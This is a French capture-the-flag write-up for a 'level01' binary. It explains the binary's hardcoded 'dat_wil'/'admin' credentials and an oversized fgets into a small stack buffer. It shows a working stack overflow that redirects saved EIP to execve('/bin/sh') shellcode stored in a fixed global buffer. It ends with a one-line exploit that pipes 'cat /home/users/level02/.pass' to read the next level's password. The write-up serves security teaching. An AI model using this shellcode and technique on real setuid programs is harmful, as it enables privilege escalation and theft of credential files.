# level 1 #

En regardant le desassemblage de `level01`, on voit que `main()` demande un nom d'utilisateur puis un mot de passe, chacun verifie par une fonction dediee qui fait un `repz cmpsb` (equivalent d'un `memcmp`/`strncmp` inline) contre une chaine codee en dur.

`verify_user_name` compare l'entree stockee dans le buffer global `0x804a040`(rempli par `fgets`) contre la chaine hardcodee `"dat_wil"` a l'adresse `0x80486a8`, sur 7 octets :

```
mov    edx,0x804a040                            edx = buffer utilisateur (username saisi)
mov    eax,0x80486a8                            eax = chaine hardcodee attendue ("dat_wil")
mov    ecx,0x7                                  longueur de comparaison = 7
mov    esi,edx                                  esi = edx
mov    edi,eax                                  edi = eax
repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]   comparaison grace a repetition materiel qui decrement ecx a chaque tour, s'arrete si ecx == 0 ou si ya une diff dans les 2 zones memoire
seta   dl
setb   al
mov    ecx,edx
sub    cl,al
mov    eax,ecx
movsx  eax,al                                   eax == 0 si les 7 octets sont identiques
```

`verify_user_pass` fait exactement la meme chose sur 5 octets, en comparant le buffer local (rempli par un second `fgets`) contre la chaine hardcodee `"admin"` a l'adresse `0x80486b0` :

```
mov    eax,DWORD PTR [ebp+0x8]                 eax == le paramettre de verify_user_pass qui est le password saisi
mov    edx,eax                                 edx == eax
mov    eax,0x80486b0                           eax = chaine hardcodee attendue ("admin")
mov    ecx,0x5                                 longueur de comparaison = 5
mov    esi,edx                                 esi = buffer utilisateur (password saisi)
mov    edi,eax
repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]  comparaison grace a repetition materiel qui decrement ecx a chaque tour, s'arrete si ecx == 0 ou si ya une diff dans les 2 zones memoire
seta   dl
setb   al
mov    ecx,edx
sub    cl,al
mov    eax,ecx
movsx  eax,al                                  eax == 0 si les 5 octets sont identiques
```

Ces credentials en dur (`dat_wil`/ `admin`) suffiraient a passer les deux verifications proprement, mais le vrai point faible du binaire est ailleurs : le second `fgets` (celui du password) on ecrit jusqu'a `0x64` (100) octets dans un buffer local beaucoup trop petit sur la stack, avant meme que `verify_user_pass` ne soit appelee :

```asm
mov    DWORD PTR [esp+0x4],0x64    taille max lue par fgets = 100
lea    eax,[esp+0x1c]              eax = buffer de 64 octets(password)
mov    DWORD PTR [esp],eax         le buffer est mit dans le premier argument de fgets
call   8048370 <fgets@plt>
```

On peut dpnc atteindre le save eip du `main()` et réécrire par dessus grace à un buffer overflow. 

On va donc écrire du shellcode a la suite du username dans la variable globale `0x804a040` (a_username a une adresse fixe, pas d'ASLR). 

L'input `dat_wil` (8 octets, qui satisfait au passage la verification du username) precede le shellcode, qui commence donc a `0x804a040 + 8 = 0x804a048`.

On doit ensuite calculer la distance entre le début du buffer local et le saved EIP. 
Le padding en `A` comble l'espace entre le debut du buffer local et l'octet ou commence l'adresse de retour sur la pile.
Et on va écraser le saved eip avec `0x0804a048` : l'adresse exacte du début du shellcode dans le buffer username. 


Quand l'exécutable `leave` / `ret` dans le `main()`, le programme ne revient pas dans `__libc_start_main` mais saute directement sur le shellcode place dans le buffer global, qui execute `/bin/sh` — herite des droits du binaire (setuid `level02`).

Et on a un shell. 

```bash
(python -c 'print ("dat_wil " + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*(255 - 21 - 8 + 80) + "\x48\xa0\x04\x08")'; echo cat /home/users/level02/.pass) | ./level01
```
